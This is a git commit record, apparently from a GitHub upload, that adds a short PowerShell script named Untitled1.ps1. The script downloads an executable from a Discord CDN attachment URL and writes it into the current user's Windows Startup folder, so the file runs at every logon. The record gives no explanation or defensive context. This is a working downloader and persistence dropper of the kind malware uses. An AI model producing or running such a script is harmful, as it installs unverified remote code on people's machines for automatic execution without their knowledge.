fc78db98b1b2d792e94e6cbca06985addaf25f55
vjmii <160060261+vjmii@users.noreply.github.com>
2024-03-23 05:38:50 +0300

    Add files via upload

---
+++ Untitled1.ps1
@@ -0,0 +1,4 @@
+﻿$exeUrl = "https://cdn.discordapp.com/attachments/1208762525546577981/1220924003196076154/tstt.exe?ex=6610b516&is=65fe4016&hm=3a88ce24d952a67d449d33c171b5b653ebbe5ffc3a0ae6265eea7530e967af5b&"
+$downloadPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\tstt.exe"
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $downloadPath
